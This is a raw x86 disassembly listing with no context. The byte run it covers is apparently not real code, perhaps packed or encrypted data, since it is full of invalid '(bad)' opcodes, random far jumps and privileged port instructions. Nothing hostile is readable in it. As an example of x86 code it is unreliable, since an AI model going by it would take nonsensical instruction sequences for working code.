  40dd3a:	mov    eax,ds:0x54c6f29b
  40dd3f:	xchg   ebp,eax
  40dd40:	shl    DWORD PTR ds:0xceac6dc8,cl
  40dd46:	out    0x1a,al
  40dd48:	jge    0x40dd6f
  40dd4a:	shr    DWORD PTR [ebx-0x70],0x55
  40dd4e:	jg     0x40dda2
  40dd50:	in     al,dx
  40dd51:	xchg   edx,eax
  40dd52:	add    eax,0xdeabf633
  40dd57:	jle    0x40dd14
  40dd59:	(bad)  
  40dd5a:	pop    edi
  40dd5b:	pop    ecx
  40dd5c:	or     BYTE PTR [eax+0x138f3588],dl
  40dd62:	lock cmc 
  40dd64:	(bad)  
  40dd65:	in     al,0x6c
  40dd67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd68:	fmul   DWORD PTR [eax+0x9ebe890]
  40dd6e:	clc    
  40dd6f:	iret   
  40dd70:	lods   eax,DWORD PTR ds:[esi]
  40dd71:	fs pop ss
  40dd73:	mov    ah,0xc8
  40dd76:	int    0xe3
  40dd78:	pop    edx
  40dd79:	daa    
  40dd7a:	cmp    BYTE PTR [eax],al
  40dd7c:	pop    eax
  40dd7d:	and    al,BYTE PTR [esi+0x14]
  40dd80:	jmp    0x40ddb7
  40dd82:	mov    ah,ah
  40dd84:	sub    BYTE PTR [ebx+esi*4],cl
  40dd87:	and    DWORD PTR [ebx-0x32],0x20
  40dd8b:	mov    bl,0x6b
  40dd8d:	dec    ebp
  40dd8e:	lock out 0x10,al
  40dd91:	mov    ch,0x98
  40dd93:	cli    
  40dd94:	jmp    0x40de13
  40dd96:	popf   
  40dd97:	pshufw mm6,QWORD PTR [ebx],0xfc
  40dd9b:	push   ss
  40dd9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd9d:	xchg   BYTE PTR [ecx+eiz*4+0x3741ed1],bh
  40dda4:	and    BYTE PTR [edx+ebp*1-0xf],dh
  40dda8:	stos   BYTE PTR es:[edi],al
  40dda9:	pop    esi
  40ddaa:	mov    esi,0x2ee8275e
  40ddaf:	stos   BYTE PTR es:[edi],al
  40ddb0:	out    dx,eax
  40ddb1:	aad    0x7b
  40ddb3:	mov    cl,0xd9
  40ddb5:	xchg   esp,eax
  40ddb6:	mov    esi,0x414a41c4
  40ddbb:	imul   al
  40ddbd:	cmc    
  40ddbe:	iret   
  40ddbf:	sbb    DWORD PTR [ebx+0x75],edx
  40ddc2:	dec    edi
  40ddc3:	dec    esp
  40ddc4:	inc    edi
  40ddc5:	and    ebx,DWORD PTR [eax-0x206eb4ea]
  40ddcb:	jecxz  0x40de41
  40ddcd:	mov    cs,WORD PTR [edi]
  40ddcf:	dec    ebp
  40ddd0:	mov    ecx,DWORD PTR [esi-0x46]
  40ddd3:	stos   BYTE PTR es:[edi],al
  40ddd4:	sar    BYTE PTR [ecx],0x78
  40ddd7:	cmp    bl,cl
  40ddd9:	jns    0x40de31
  40dddb:	cli    
  40dddc:	add    al,0xc8
  40ddde:	sbb    al,0x4
  40dde0:	jl     0x40ddeb
  40dde2:	xor    ecx,DWORD PTR [ebx+ecx*8-0x12432fb7]
  40dde9:	repz icebp 
  40ddeb:	js     0x40dd8a
  40dded:	cmp    al,0xb3
  40ddef:	mov    eax,0x7acf27d5
  40ddf4:	pop    edi
  40ddf5:	bound  ecx,QWORD PTR [edx-0x57ea4c46]
  40ddfb:	add    cl,BYTE PTR [edi+0x295dc63d]
  40de01:	add    DWORD PTR [eax],ebx
  40de03:	and    cl,dh
  40de05:	loopne 0x40dde0
  40de07:	addr16 mov ebp,0xfeb2a6a5
  40de0d:	pop    ecx
  40de0e:	aas    
  40de0f:	add    BYTE PTR [edx-0x30a7a580],dh
  40de15:	(bad)  
  40de16:	mov    edi,0x6268883
  40de1b:	cmp    dl,dl
  40de1d:	dec    ecx
  40de1e:	call   0x5774dbab
  40de23:	ss mov edx,0xdfba185d
  40de29:	inc    ebx
  40de2a:	test   DWORD PTR [ecx],edx
  40de2c:	idiv   ch
  40de2e:	test   DWORD PTR [ebx],edi
  40de30:	retf   0x8045
  40de33:	xchg   esi,eax
  40de34:	dec    edx
  40de35:	stos   DWORD PTR es:[edi],eax
  40de36:	nop
  40de37:	mov    ah,0x3c
  40de39:	scas   al,BYTE PTR es:[edi]
  40de3a:	les    edi,FWORD PTR [eax]
  40de3c:	jns    0x40de97
  40de3e:	rol    ebx,cl
  40de40:	(bad)  
  40de41:	sbb    dl,dh
  40de43:	(bad)  
  40de44:	jecxz  0x40de8c
  40de46:	sbb    BYTE PTR [esi],0x42
  40de49:	cmp    esp,esi
  40de4b:	mov    ?,WORD PTR [edx-0x71]
  40de4e:	je     0x40ddfb
  40de50:	xor    eax,0x71b3f57
  40de55:	mov    ah,bl
  40de57:	jmp    0x40dea6
  40de59:	test   BYTE PTR [esi],bh
  40de5b:	xchg   ecx,eax
  40de5c:	rcl    DWORD PTR [eax+ecx*2+0x5a],0xb9
  40de61:	push   esp
  40de62:	cmp    ah,BYTE PTR [ebx+0x2d8abf3d]
  40de68:	into   
  40de69:	and    ebp,0x101db288
  40de6f:	les    ecx,FWORD PTR [esi+0x14de756e]
  40de75:	addr16 mov ebp,0xa2984d04
  40de7b:	fistp  DWORD PTR [edi]
  40de7d:	shr    DWORD PTR [eax-0x32e734d1],0xd8
  40de84:	and    BYTE PTR [ecx],0xb3
  40de87:	dec    esi
  40de88:	sub    BYTE PTR [esi+0x6070d770],ah
  40de8e:	and    dl,BYTE PTR [esi-0xa]
  40de91:	test   DWORD PTR [ebx],0x81b0a736
  40de97:	out    dx,eax
  40de98:	lods   al,BYTE PTR ds:[esi]
  40de99:	lods   eax,DWORD PTR ds:[esi]
  40de9a:	sub    BYTE PTR [esi+0x44],bh
  40de9d:	cdq    
  40de9e:	fcmovnb st,st(5)
  40dea0:	sbb    DWORD PTR [ebp+0x7ab70129],edi
  40dea6:	xor    BYTE PTR [eax+0x0],ah
  40dea9:	mov    ecx,0x9b408e82
  40deae:	mov    dl,0xc8
  40deb0:	inc    edi
  40deb1:	push   ss
  40deb2:	les    esi,FWORD PTR [ebp-0x42]
  40deb5:	cmc    
  40deb6:	add    edi,DWORD PTR [ebx]
  40deb8:	ror    esi,1
  40deba:	call   0xc784a927
  40debf:	jle    0x40def5
  40dec1:	and    al,0xff
  40dec3:	xchg   esi,eax
  40dec4:	in     eax,0x83
  40dec6:	mov    WORD PTR [edi-0x3bb77b8],ss
  40decc:	jmp    0xc292:0x4728e57f
  40ded3:	popf   
  40ded4:	lods   eax,DWORD PTR ds:[esi]
  40ded5:	push   eax
  40ded6:	inc    edx
  40ded7:	test   al,0x37
  40ded9:	outs   dx,DWORD PTR ds:[esi]
  40deda:	xor    al,0xae
  40dedc:	add    al,0xd5
  40dede:	lea    ecx,[edx]
  40dee0:	fwait
  40dee1:	scas   eax,DWORD PTR es:[edi]
  40dee2:	daa    
  40dee3:	xchg   WORD PTR [esi],ax
  40dee6:	scas   eax,DWORD PTR es:[edi]
  40dee7:	bound  esp,QWORD PTR [edi]
  40dee9:	inc    eax
  40deea:	out    dx,al
  40deeb:	mov    ds,WORD PTR [ecx-0x2a651d6f]
  40def1:	bound  eax,QWORD PTR ds:0x2d53f21c
  40def7:	lock (bad) 
  40def9:	out    0x23,eax
  40defb:	xchg   edx,eax
  40defc:	daa    
  40defd:	inc    edi
  40defe:	sbb    BYTE PTR [esi],ah
  40df00:	test   DWORD PTR [ecx+0x64],0xa4fdd9b5
  40df07:	and    DWORD PTR [esp+ebx*8-0x46],0x4c
  40df0c:	cmp    ch,bl
  40df0e:	mov    edi,0x8a200165
  40df13:	cmp    eax,0x3853eb22
  40df18:	ss aad 0xe9
  40df1b:	out    0xf0,eax
  40df1d:	loop   0x40deed
  40df1f:	and    dh,BYTE PTR [edi+eax*2+0x35af8789]
  40df26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df27:	cld    
  40df28:	pop    ds
  40df29:	jmp    0xde84:0x7b93142c
  40df30:	sub    eax,0xaf3bd074
  40df35:	pop    ecx
  40df36:	sbb    al,BYTE PTR [eax+0x6078e489]
  40df3c:	xor    eax,0x4e50912c
  40df41:	aas    
  40df42:	adc    eax,0xceb2c563
  40df47:	mov    ebx,0xd6b77c84
  40df4c:	sbb    BYTE PTR [esi-0x40d0f28c],cl
  40df52:	xor    al,0x15
  40df54:	mov    DWORD PTR [ebx],edi
  40df56:	out    0x7a,eax
  40df58:	test   BYTE PTR [ebx+0x76182357],0xb0
  40df5f:	sbb    DWORD PTR [ebx],0xc
  40df62:	and    eax,0x349d825b
  40df67:	xchg   ecx,eax
  40df68:	call   0x1fc55122
  40df6d:	adc    DWORD PTR [eax-0x5e46d165],ebp
  40df73:	push   ebx
  40df74:	mov    bl,0x55
  40df76:	push   ecx
  40df77:	lods   al,BYTE PTR ds:[esi]
  40df78:	or     eax,0xccc73622
  40df7d:	stos   BYTE PTR es:[edi],al
  40df7e:	jle    0x40df6c
  40df80:	repz xchg ebp,eax
  40df82:	imul   eax,DWORD PTR [eax-0x7c],0x77
  40df86:	mov    bh,0x8f
  40df88:	sbb    eax,0x516a450b
  40df8d:	test   al,0x85
  40df8f:	mov    eax,ds:0x5c01b1fe
  40df94:	icebp  
  40df95:	inc    ebp
  40df96:	in     al,dx
  40df97:	mul    DWORD PTR [ecx]
  40df99:	push   ecx
  40df9a:	repnz (bad) ds:[esi]
  40df9e:	gs out dx,eax
  40dfa0:	outs   dx,BYTE PTR ds:[esi]
  40dfa1:	mov    ebx,0x92654d25
  40dfa6:	retf   0xadc8
  40dfa9:	into   
  40dfaa:	sbb    DWORD PTR [ebp+0x29],0xf809d2b9
  40dfb1:	out    0x64,eax
  40dfb3:	push   DWORD PTR [edx-0x25]
  40dfb6:	es jbe 0x40dfd8
  40dfb9:	pop    edx
  40dfba:	adc    BYTE PTR [ebx],ch
  40dfbc:	fcom   QWORD PTR ds:0xf45feb4a
  40dfc2:	mov    bh,0x9e
  40dfc4:	pop    edx
  40dfc5:	mov    fs,edi
  40dfc7:	ja     0x40e032
  40dfc9:	xchg   esi,eax
  40dfca:	sar    DWORD PTR [ebp-0x3],0x15
  40dfce:	stos   DWORD PTR es:[edi],eax
  40dfcf:	ins    BYTE PTR es:[edi],dx
  40dfd0:	or     eax,0x5f5fbf58
  40dfd5:	push   es
  40dfd6:	push   esi
  40dfd7:	xor    esp,DWORD PTR [ebp-0x314a8a12]
  40dfdd:	repnz out 0xd2,al
  40dfe0:	icebp  
  40dfe1:	sti    
  40dfe2:	adc    al,0xb
  40dfe5:	imul   cl
  40dfe7:	call   0x150d8acb
  40dfec:	mov    ds:0x7db77c8c,al
  40dff1:	ficomp WORD PTR [esp+eax*4-0x61]
  40dff5:	outs   dx,DWORD PTR ds:[si]
  40dff7:	push   esp
  40dff8:	cld    
  40dff9:	out    0x22,eax
  40dffb:	fdiv   DWORD PTR [esi+0x322dd048]
  40e001:	arpl   si,ax
  40e003:	gs adc al,0x56
  40e006:	dec    BYTE PTR [ebx]
  40e008:	pop    edx
  40e009:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e00a:	mov    ch,BYTE PTR [edx]
  40e00c:	(bad)  
  40e00d:	loopne 0x40e06a
  40e00f:	jle    0x40e005
  40e011:	adc    esi,DWORD PTR [eax]
  40e013:	retf   
  40e014:	mov    edx,0xddad0673
  40e019:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e01a:	sub    eax,0x5a3c768c
  40e01f:	aad    0xdc
  40e021:	outs   dx,BYTE PTR ds:[esi]
  40e022:	mov    dl,0x3d
  40e024:	(bad)  
  40e025:	jmp    0xacb4a0c4
  40e02a:	ins    DWORD PTR es:[edi],dx
  40e02b:	cdq    
  40e02c:	jle    0x40e015
  40e02e:	imul   DWORD PTR [ebp+ebp*1+0x7c]
  40e032:	or     edx,esi
  40e034:	jp     0x40e015
  40e036:	jae    0x40dfee
  40e038:	ss xchg ebp,eax
  40e03a:	jmp    0x40e05d
  40e03c:	or     eax,esi
  40e03e:	fnstcw WORD PTR [eax-0x23]
  40e041:	mov    ?,WORD PTR [ebp+edi*2-0x45]
  40e045:	pop    es
  40e046:	ins    BYTE PTR es:[edi],dx
  40e047:	sub    al,0x64
  40e049:	dec    edi
  40e04a:	cmp    eax,0x5ae3eae6
  40e04f:	jb     0x40e0c5
  40e051:	pusha  
  40e052:	mov    ebp,0xa539190f
  40e057:	mov    dl,0x3c
  40e059:	iret   
  40e05a:	jne    0x40e0a5
  40e05c:	repnz mov ch,0x46
  40e05f:	mov    ebx,0x7b0a662c
  40e064:	adc    ebx,DWORD PTR [ecx+0x67]
  40e067:	aas    
  40e068:	int3   
  40e069:	cwde   
  40e06a:	add    eax,edx
  40e06c:	pop    ebp
  40e06d:	fidivr DWORD PTR [edx+0x103dfbc6]
  40e073:	inc    esp
  40e074:	repnz loope 0x40e04a
  40e077:	sbb    DWORD PTR [edi-0x7d47ab45],edx
  40e07d:	(bad)  fs:[esi]
  40e080:	repnz aam 0x91
  40e083:	sbb    ah,BYTE PTR [edx+0x4a6ab75d]
  40e089:	and    al,dh
  40e08b:	jp     0x40e0d5
  40e08d:	push   ebx
  40e08e:	es pop es
  40e090:	ds mov edi,?
  40e093:	push   ebp
  40e094:	mov    bh,0xf7
  40e096:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e097:	inc    edi
  40e098:	aam    0xfd
  40e09a:	inc    eax
  40e09b:	xlat   BYTE PTR ds:[ebx]
  40e09c:	or     eax,ecx
  40e09e:	ins    BYTE PTR es:[edi],dx
  40e09f:	sbb    al,0xd8
  40e0a1:	jnp    0x40e060
  40e0a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0a4:	outs   dx,BYTE PTR ds:[esi]
  40e0a5:	call   0x91e510a4
  40e0aa:	retf   
  40e0ab:	fidivr DWORD PTR es:[eax+0x77]
  40e0af:	int    0x39
  40e0b1:	outs   dx,BYTE PTR ds:[esi]
  40e0b2:	mov    ah,0xf5
  40e0b4:	test   BYTE PTR [edi+0x76012aa5],ch
  40e0ba:	in     eax,dx
  40e0bb:	std    
  40e0bc:	xor    al,0xdd
  40e0be:	add    dh,bh
  40e0c0:	hlt    
  40e0c1:	mov    bh,0xc
  40e0c3:	imul   ebp,DWORD PTR [esi-0x5c843fb],0xffffffaa
  40e0ca:	xchg   edi,eax
  40e0cb:	inc    ebx
  40e0cc:	or     ch,BYTE PTR [ebp+ebx*4-0x63]
  40e0d0:	int3   
  40e0d1:	pop    eax
  40e0d2:	lds    ebx,FWORD PTR [ebp-0x11]
  40e0d5:	clc    
  40e0d6:	das    
  40e0d7:	les    edi,FWORD PTR [ebp-0x119ed270]
  40e0dd:	mov    dh,0x74
  40e0df:	mov    es:0x2b93e6fb,al
  40e0e5:	out    dx,eax
  40e0e6:	mov    bh,0x13
  40e0e8:	dec    edi
  40e0e9:	mov    edx,0x9e6e2e37
  40e0ee:	jg     0x40e107
  40e0f0:	mov    DWORD PTR [edi-0x3b01de35],ebx
  40e0f6:	pop    ebx
  40e0f7:	pop    esi
  40e0f8:	adc    BYTE PTR [eax-0x42],bh
  40e0fb:	nop
  40e0fc:	out    0x9d,al
  40e0fe:	jbe    0x40e0b1
  40e100:	cs push 0xd0610848
  40e106:	fxch   st(7)
  40e108:	shr    BYTE PTR [edx],1
  40e10a:	push   0x3d8d2ac6
  40e10f:	pop    ebp
  40e110:	das    
  40e111:	and    edx,DWORD PTR [ecx+ebp*1-0x268063b3]
  40e118:	push   DWORD PTR [edx]
  40e11a:	call   0x3327:0x40757baa
  40e121:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e122:	data16 jle 0x40e167
  40e125:	lea    ecx,[edi]
  40e127:	dec    eax
  40e128:	inc    edx
  40e129:	outs   dx,DWORD PTR ds:[esi]
  40e12a:	add    eax,0xfcd5e4a8
  40e12f:	push   cs
  40e130:	xor    al,0x3c
  40e132:	stos   BYTE PTR es:[edi],al
  40e133:	nop
  40e134:	cmp    dl,dl
  40e136:	push   cs
  40e137:	jmp    0x7912:0x47cba7d8
  40e13e:	push   es
  40e13f:	fistp  DWORD PTR [esi+0x49]
  40e142:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e143:	adc    eax,0xbe687df8
  40e148:	pushf  
  40e149:	or     bh,bl
  40e14b:	fidivr DWORD PTR [edi]
  40e14d:	nop
  40e14e:	inc    eax
  40e14f:	test   BYTE PTR [esi-0x74],0xef
  40e153:	xor    BYTE PTR [edx+0x4447bdd7],dh
  40e159:	jno    0x40e152
  40e15b:	ss out 0x8e,al
  40e15e:	out    dx,al
  40e15f:	ins    BYTE PTR es:[edi],dx
  40e160:	sub    eax,0xcef1c5fd
  40e165:	push   esp
  40e166:	dec    esi
  40e167:	pop    eax
  40e168:	pop    ds
  40e169:	mov    edx,0xb37e1c3
  40e16e:	sahf   
  40e16f:	add    dh,0xec
  40e172:	sbb    esp,DWORD PTR [esi]
  40e174:	rol    DWORD PTR [ecx+0x74],cl
  40e177:	push   cs
  40e178:	sbb    al,0x88
  40e17a:	push   ecx
  40e17b:	mov    eax,ds:0xddba1194
  40e180:	loope  0x40e128
  40e182:	sbb    DWORD PTR [eax+0x11],eax
  40e185:	mov    ss,edi
  40e187:	mov    ch,0x8a
  40e189:	pushf  
  40e18a:	xor    ecx,DWORD PTR [ebp+0xf]
  40e18d:	push   esp
  40e18e:	xchg   esi,eax
  40e18f:	jmp    0x72ce:0x5d37f204
  40e196:	pop    eax
  40e197:	push   esi
  40e198:	dec    ebx
  40e199:	clc    
  40e19a:	ins    BYTE PTR es:[edi],dx
  40e19b:	imul   edx,DWORD PTR ds:0x932062e3,0x1b
  40e1a2:	mov    dl,0xb6
  40e1a4:	or     BYTE PTR [esi+0xc],al
  40e1a7:	push   cs
  40e1a8:	mov    cs,edi
  40e1aa:	fisubr DWORD PTR [ebx+0x78af1be5]
  40e1b0:	or     ecx,DWORD PTR [ebx-0x40]
  40e1b3:	je     0x40e206
  40e1b5:	jmp    0x40e160
  40e1b7:	pop    esi
  40e1b8:	enter  0xd3dd,0xf
  40e1bc:	punpcklwd mm6,DWORD PTR [edx]
  40e1bf:	cs in  eax,0xe2
  40e1c2:	mov    bh,0x0
  40e1c4:	xor    esi,DWORD PTR [ebp-0x35]
  40e1c7:	jo     0x40e1ad
  40e1c9:	pop    esi
  40e1ca:	(bad)  
  40e1cb:	(bad)  
  40e1cc:	sbb    DWORD PTR ds:0x99b0974b,0xf16b6d90
  40e1d6:	xchg   ecx,eax
  40e1d7:	adc    DWORD PTR [edi-0x410f833a],ecx
  40e1dd:	popf   
  40e1de:	xchg   BYTE PTR [esi-0xc794bd1],dh
  40e1e4:	aaa    
  40e1e5:	mov    edx,0xb5076c74
  40e1ea:	inc    eax
  40e1eb:	push   eax
  40e1ec:	and    edx,edx
  40e1ee:	scas   eax,DWORD PTR es:[edi]
  40e1ef:	imul   edi,DWORD PTR [edx+0x3a6dd1e2],0xffffff8e
  40e1f6:	out    0xac,al
  40e1f8:	or     al,BYTE PTR [edi+0x1a9eb4d1]
  40e1fe:	ret    
  40e1ff:	jge    0x40e274
  40e201:	pop    eax
  40e202:	sar    BYTE PTR [ebp+0x3d3d22e2],0x71
  40e209:	fist   WORD PTR [edx+0x59961f0]
  40e20f:	adc    al,0x99
  40e211:	je     0x40e243
  40e213:	sbb    eax,0xc95f2596
  40e218:	sbb    dl,cl
  40e21a:	cmp    ebx,edx
  40e21c:	enter  0x8e6a,0x77
  40e220:	cmp    eax,0x55017594
  40e225:	pop    ebx
  40e226:	retf   0xb3da
  40e229:	imul   edi,ebp,0xffffffaf
  40e22c:	jno    0x40e25d
  40e22e:	das    
  40e22f:	sub    DWORD PTR [edx-0x4e],ecx
  40e232:	nop
  40e233:	add    BYTE PTR [ebp-0x5f],bh
  40e236:	imul   eax,ebp,0x113d80cf
  40e23c:	jns    0x40e2b5
  40e23e:	daa    
  40e23f:	gs daa 
  40e241:	and    dh,BYTE PTR [edi+0x4b4e2300]
  40e247:	and    ah,dl
  40e249:	add    ah,BYTE PTR [ebx-0x3dff4c5e]
  40e24f:	(bad)  [edi+0x46]
  40e252:	pop    esi
  40e253:	test   BYTE PTR [edx+eax*8-0x44],bl
  40e257:	or     DWORD PTR [edx-0x14],0x84957c9d
  40e25e:	loopne 0x40e26f
  40e260:	outs   dx,BYTE PTR ds:[esi]
  40e261:	fnop   
  40e263:	inc    edx
  40e265:	retf   
  40e266:	xchg   ebp,eax
  40e267:	stos   BYTE PTR es:[edi],al
  40e268:	and    DWORD PTR [esi-0x89cb566],esi
  40e26e:	(bad)  
  40e270:	sub    BYTE PTR [edi-0x63],bh
  40e273:	fcom   DWORD PTR [ecx+eax*8-0x1ba4305f]
  40e27a:	dec    ebp
  40e27b:	retf   
  40e27c:	jg     0x40e2c6
  40e27e:	call   0x5b19:0x43f28946
  40e285:	cmp    al,cl
  40e287:	xor    al,0x87
  40e289:	mov    al,0x52
  40e28b:	or     eax,0x15b5fc46
  40e290:	cmp    edi,DWORD PTR ds:0x858d0c08
  40e296:	scas   eax,DWORD PTR es:[edi]
  40e297:	(bad)  
  40e299:	add    BYTE PTR [edi+0x5597e216],0x76
  40e2a0:	stos   DWORD PTR es:[edi],eax
  40e2a1:	inc    eax
  40e2a2:	lahf   
  40e2a3:	inc    edx
  40e2a4:	cmp    eax,DWORD PTR ds:0x6d57fc01
  40e2aa:	sub    eax,0xd5760e50
  40e2af:	cmc    
  40e2b0:	shr    DWORD PTR [eax],1
  40e2b2:	leave  
  40e2b3:	and    cl,BYTE PTR [edi+0x36c47f47]
  40e2b9:	cmp    eax,DWORD PTR [edx+0x6d]
  40e2bc:	pop    ss
  40e2bd:	jmp    0x40e310
  40e2bf:	sbb    BYTE PTR [edx-0x1384d3dc],cl
  40e2c5:	outs   dx,DWORD PTR ds:[esi]
  40e2c6:	rcr    BYTE PTR [esi-0xcc5b51d],cl
  40e2cc:	aad    0x4b
  40e2ce:	and    esi,DWORD PTR [edx+0x21]
  40e2d1:	fwait
  40e2d2:	xchg   BYTE PTR [edx+0xa],ch
  40e2d5:	mov    dl,0x1a
  40e2d8:	test   BYTE PTR [ecx+0x1a260b2b],ah
  40e2de:	pop    esp
  40e2df:	sub    BYTE PTR [ebx],bh
  40e2e1:	mov    ds:0x63119f0d,al
  40e2e6:	lahf   
  40e2e7:	(bad)  
  40e2e8:	in     al,dx
  40e2e9:	jo     0x40e30c
  40e2eb:	and    dh,bh
  40e2ed:	nop
  40e2ee:	mov    BYTE PTR [edi],ch
  40e2f0:	add    al,0x60
  40e2f2:	push   ebx
  40e2f3:	xchg   edx,eax
  40e2f4:	out    dx,al
  40e2f5:	cmp    al,0x6
  40e2f7:	mov    ds,WORD PTR [ecx]
  40e2f9:	pop    DWORD PTR [esi-0x684551a5]
  40e2ff:	loope  0x40e2cf
  40e301:	jmp    0x7da53d0c
  40e306:	push   ebp
  40e307:	push   es
  40e308:	imul   edi,DWORD PTR [ebx+0x6e],0xeb7a627c
  40e30f:	fst    DWORD PTR ds:0xd14a6f1b
  40e315:	ret    
  40e316:	(bad)
  40e319:	aaa    
  40e31a:	call   0xc307:0xb41901a3
  40e321:	clc    
  40e322:	popf   
  40e323:	test   eax,0xa1cbca11
  40e328:	es test eax,0x1887dc6b
  40e32e:	cmp    DWORD PTR [eax-0x2549d387],edx
  40e334:	in     al,0x5
  40e336:	je     0x40e2db
  40e338:	lods   eax,DWORD PTR ds:[esi]
  40e339:	stos   BYTE PTR es:[edi],al
  40e33a:	cdq    
  40e33b:	lock test dh,dl
  40e33e:	fsub   QWORD PTR [ecx-0x47]
  40e341:	pusha  
  40e342:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e344:	pusha  
  40e345:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e346:	push   edi
  40e347:	fs jns 0x40e377
  40e34a:	or     eax,DWORD PTR [edx-0x4d]
  40e34d:	pop    ds
  40e34e:	fmul   st(0),st
  40e350:	mov    ds:0x3bf4b369,al
  40e355:	adc    BYTE PTR [eax+0x32],bh
  40e358:	dec    ebp
  40e359:	ss ins BYTE PTR es:[edi],dx
  40e35b:	jle    0x40e345
  40e35d:	pushf  
  40e35e:	mov    cl,0x11
  40e360:	cmp    dl,BYTE PTR [esi+0x5e50a3c7]
  40e366:	add    al,0x6e
  40e368:	cmp    ebx,DWORD PTR [edi+0x2762efca]
  40e36e:	mov    ds:0xa1a4f130,al
  40e373:	(bad)  
  40e374:	aas    
  40e375:	push   ecx
  40e376:	mov    DWORD PTR [edx-0x2faa6fff],esp
  40e37c:	paddb  mm2,mm4
  40e37f:	cmp    eax,0x4ab00f47
  40e384:	out    0x69,al
  40e386:	cs jp  0x40e387
  40e389:	call   0x80ddee3
  40e38e:	mov    al,0x2c
  40e390:	jl     0x40e3e4
  40e392:	push   0x1
  40e394:	sahf   
  40e395:	mov    bl,0xa5
  40e397:	sbb    al,0xf3
  40e399:	push   es
  40e39a:	adc    DWORD PTR [edx],eax
  40e39c:	jl     0x40e3fc
  40e39e:	add    DWORD PTR [esi-0x57],esi
  40e3a1:	arpl   bx,cx
  40e3a3:	cmp    DWORD PTR [eax+0x1327de2a],esp
  40e3a9:	test   DWORD PTR [edi+edx*4+0x4c],ecx
  40e3ad:	rcl    BYTE PTR [edi-0x6d],0x93
  40e3b1:	adc    DWORD PTR [ecx+0x21],edx
  40e3b4:	into   
  40e3b5:	test   cl,0xa8
  40e3b8:	ret    
  40e3b9:	push   0x7cd65448
  40e3be:	sub    BYTE PTR [edx+0x1ae30798],0x73
  40e3c5:	mov    edx,0x786c5358
  40e3ca:	adc    DWORD PTR [esi-0x16],esi
  40e3cd:	iret   
  40e3ce:	push   es
  40e3cf:	add    bh,BYTE PTR [esi]
  40e3d1:	test   al,0x50
  40e3d3:	bound  edi,QWORD PTR [ecx+ebx*1]
  40e3d6:	je     0x40e36a
  40e3d8:	push   edi
  40e3d9:	inc    ecx
  40e3da:	test   DWORD PTR [esi+ebp*8],edx
  40e3dd:	sbb    BYTE PTR ds:0x358dfd97,ch
  40e3e3:	push   cs
  40e3e4:	mov    DWORD PTR [ebp+0x1e33c4bf],edi
  40e3ea:	aas    
  40e3eb:	shl    DWORD PTR [ecx-0x3e],1
  40e3ee:	mov    ss,eax
  40e3f0:	(bad)  
  40e3f1:	loope  0x40e45b
  40e3f3:	push   ebx
  40e3f4:	fld    DWORD PTR [esp+edx*8-0x3c38575b]
  40e3fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3fc:	jmp    0x5e8b26d1
  40e401:	jo     0x40e397
  40e403:	into   
  40e404:	daa    
  40e405:	inc    edi
  40e406:	mov    esi,0x9db75c0b
  40e40b:	sar    BYTE PTR [ecx+0x5d2bef37],1
  40e411:	or     BYTE PTR [edx],bh
  40e413:	push   ebp
  40e414:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e415:	dec    esi
  40e416:	add    eax,0x2f3e0be0
  40e41b:	aam    0x9
  40e41d:	or     edx,ebp
  40e41f:	push   ebx
  40e420:	mov    dl,0x46
  40e422:	mov    BYTE PTR [ebx],dh
  40e424:	cmp    ebp,DWORD PTR [eax+0x3d]
  40e427:	ret    0xd894
  40e42a:	jmp    0x40e440
  40e42c:	lds    esp,FWORD PTR [edi+eiz*2+0x682110d2]
  40e433:	sub    esi,eax
  40e435:	jge    0x40e41e
  40e437:	sahf   
  40e438:	cld    
  40e439:	int3   
  40e43a:	inc    edi
  40e43b:	push   ds
  40e43c:	int3   
  40e43d:	xchg   BYTE PTR [ebx+0x2fba7a6],cl
  40e443:	inc    edi
  40e444:	jp     0x40e458
  40e446:	aam    0x57
  40e448:	icebp  
  40e449:	mov    ebp,0xb32b2fea
  40e44e:	popf   
  40e44f:	sbb    BYTE PTR [esi],dh
  40e451:	sub    BYTE PTR [ecx+0x28],cl
  40e454:	fs ds icebp 
  40e457:	cmp    BYTE PTR [esi+0x66],ch
  40e45a:	retf   
  40e45b:	xchg   BYTE PTR [edi-0xd],al
  40e45e:	imul   esp,esp,0xa078908e
  40e464:	iret   
  40e465:	pusha  
  40e466:	mov    ch,BYTE PTR cs:[ecx-0x29849438]
  40e46d:	stos   DWORD PTR es:[edi],eax
  40e46e:	add    cl,dh
  40e470:	gs out 0x7b,eax
  40e473:	loopne 0x40e491
  40e475:	mov    bh,0xd0
  40e477:	pusha  
  40e478:	and    DWORD PTR [edx],ebp
  40e47a:	or     eax,0x8bce2348
  40e47f:	xor    DWORD PTR [esi+0x74],eax
  40e482:	rcr    BYTE PTR [ebp-0x7e],0x98
  40e486:	dec    eax
  40e487:	aam    0x4e
  40e489:	daa    
  40e48a:	sub    BYTE PTR [ebx+0x36],al
  40e48d:	mov    al,0x7c
  40e48f:	call   FWORD PTR [edx+0x62]
  40e492:	xor    ecx,edi
  40e494:	aaa    
  40e495:	add    esp,DWORD PTR [ebp+0x46]
  40e498:	ret    
  40e499:	int    0x17
  40e49b:	add    DWORD PTR [eax-0x7d],eax
  40e49e:	rol    esi,0x2e
  40e4a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4a2:	pop    esp
  40e4a3:	ins    BYTE PTR es:[edi],dx
  40e4a4:	repz retf 0x4ba
  40e4a8:	rol    dh,0xea
  40e4ab:	test   edx,esi
  40e4ad:	mov    edi,0xf8d40e3a
  40e4b2:	ja     0x40e4be
  40e4b4:	jecxz  0x40e4a6
  40e4b6:	loopne 0x40e499
  40e4b8:	outs   dx,DWORD PTR fs:[esi]
  40e4ba:	mov    ecx,0xed676bec
